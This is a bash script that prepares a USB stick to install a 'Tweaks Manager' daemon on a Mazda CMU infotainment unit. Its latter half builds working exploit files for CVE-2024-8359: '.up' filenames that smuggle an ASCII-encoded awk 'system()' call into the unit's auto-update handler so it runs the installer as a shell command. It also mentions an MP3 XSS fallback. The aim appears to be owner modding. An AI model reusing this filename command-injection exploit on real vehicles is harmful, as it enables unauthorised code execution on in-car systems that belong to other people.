#!/bin/bash
# Tweaks Manager — USB Stick Creator
# Run on Mac/Linux to prepare a USB stick for CMU installation
#
# Usage: ./toolkit.sh /path/to/usb/mount

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

USB="${1:-}"
if [ -z "$USB" ]; then
    echo "Usage: $0 /path/to/usb/mount"
    echo ""
    echo "Example (macOS): $0 /Volumes/MZD"
    echo "Example (Linux): $0 /media/user/MZD"
    exit 1
fi

if [ ! -d "$USB" ]; then
    echo "Error: $USB is not a directory"
    exit 1
fi

echo "=== Tweaks Manager USB Creator ==="
echo "Target: $USB"
echo ""

# check tweaksd binary exists
TWEAKSD="$PROJECT_DIR/tweaksd/tweaksd"
if [ ! -f "$TWEAKSD" ]; then
    echo "Error: tweaksd binary not found at $TWEAKSD"
    echo "Build it first: cd tweaksd && make"
    exit 1
fi

file "$TWEAKSD" | grep -q "ARM" || {
    echo "Error: tweaksd is not an ARM binary. Cross-compile with 'make'."
    exit 1
}

echo "[1/5] Creating directory structure..."
mkdir -p "$USB/tweaks-manager/installer"
mkdir -p "$USB/tweaks-manager/tweaks"
mkdir -p "$USB/tweaks-manager/jci-app"

echo "[2/5] Copying installer files..."
cp "$SCRIPT_DIR/t" "$USB/tweaks-manager/installer/"
cp "$SCRIPT_DIR/tweaks.sh" "$USB/tweaks-manager/installer/"
chmod +x "$USB/tweaks-manager/installer/t"
chmod +x "$USB/tweaks-manager/installer/tweaks.sh"

echo "[3/5] Copying daemon binary..."
cp "$TWEAKSD" "$USB/tweaks-manager/installer/tweaksd"
chmod +x "$USB/tweaks-manager/installer/tweaksd"

echo "[4/5] Copying JCI app..."
cp "$PROJECT_DIR/jci-app/tweaks-bootstrap.js" "$USB/tweaks-manager/jci-app/"
cp "$PROJECT_DIR/jci-app/tweaksApp.js" "$USB/tweaks-manager/jci-app/"

echo "[5/5] Copying sample tweaks..."
if [ -d "$PROJECT_DIR/tweaks" ]; then
    cp -r "$PROJECT_DIR/tweaks/"* "$USB/tweaks-manager/tweaks/" 2>/dev/null || true
fi

# Create .up injection files (CVE-2024-8359)
echo ""
echo "Creating .up injection payloads..."

# The .up filename encodes: sh /mnt/sd[abcd]1/tweaks-manager/installer/t
# Using awk sprintf with ASCII codes to bypass FAT32 filename restrictions
# ASCII: s=115 h=104 space=32 /=47 m=109 n=110 t=116 d=100 [=91 a=97 b=98 c=99 ]=93 1=49
# Full path: sh /mnt/sd[abcd]1/tweaks-manager/installer/t

# For /mnt/ path
UP_CMD_MNT='sh /mnt/sd[abcd]1/tweaks-manager/installer/t'
# For /tmp/mnt/ path
UP_CMD_TMP='sh /tmp/mnt/sd[abcd]1/tweaks-manager/installer/t'

# Create .up filenames using awk ASCII encoding
# /mnt/ variant
UP_MNT=$(awk 'BEGIN{
  s=sprintf("%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c",
    115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116,119,101,97,107,115,45,109,97,110,97,103,101,114,47,105,110,115,116,97,108,108,101,114,47,116,0,0);
  print s}')

# Since FAT32 cannot have / in filenames, we use the awk-in-filename trick
# from mazda-hud-toolkit. The .up filename itself contains the awk command.

# Create the actual .up files
# We need jci-autoupdate marker too
touch "$USB/jci-autoupdate"

# Create the .up payload files
# Path 1: /mnt/sd*1/
UP_FILE_1='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116,119,101,97,107,115,45,109,97,110,97,103,101,114,47,105,110,115,116,97,108,108,101,114,47,116))}'"'"').up'

# Path 2: /tmp/mnt/sd*1/
UP_FILE_2='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116,119,101,97,107,115,45,109,97,110,97,103,101,114,47,105,110,115,116,97,108,108,101,114,47,116))}'"'"').up'

# Create files using eval to handle the special characters
cd "$USB"
eval "touch $UP_FILE_1" 2>/dev/null || echo "Warning: could not create /mnt/ .up file (expected on non-FAT32)"
eval "touch $UP_FILE_2" 2>/dev/null || echo "Warning: could not create /tmp/mnt/ .up file (expected on non-FAT32)"
cd - > /dev/null

# Clean up Apple double files
find "$USB" -name "._*" -delete 2>/dev/null
find "$USB" -name ".DS_Store" -delete 2>/dev/null

echo ""
echo "=== Done ==="
echo ""
echo "USB stick contents:"
find "$USB/tweaks-manager" -type f | sort | while read f; do
    echo "  ${f#$USB/}"
done
echo ""
echo "To install: insert USB into CMU and wait for auto-trigger,"
echo "or use the MP3 XSS fallback."
echo ""
echo "Tweaks on USB ($USB/tweaks-manager/tweaks/):"
ls "$USB/tweaks-manager/tweaks/" 2>/dev/null || echo "  (none)"
